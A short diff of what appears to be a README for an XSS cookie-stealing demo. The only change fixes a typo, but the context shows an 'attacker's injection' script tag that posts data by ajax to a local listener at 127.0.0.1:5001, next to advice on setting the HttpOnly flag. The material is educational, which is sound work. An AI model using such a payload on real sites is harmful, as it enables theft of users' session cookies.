@@ -7,4 +7,4 @@ Attacker's injection: `<script>$.ajax({ url : 'http://127.0.0.1:5001/listen', ty
 
 A good way to prevent XSS attacks on cookies is to set the `HttpOnly` flag of the cookie. This makes the cookie unavailable to scripting languages like JavaScript.
 
-Give me a star if this has helped you in anyway!
+Give me a star if this has helped you in any way!
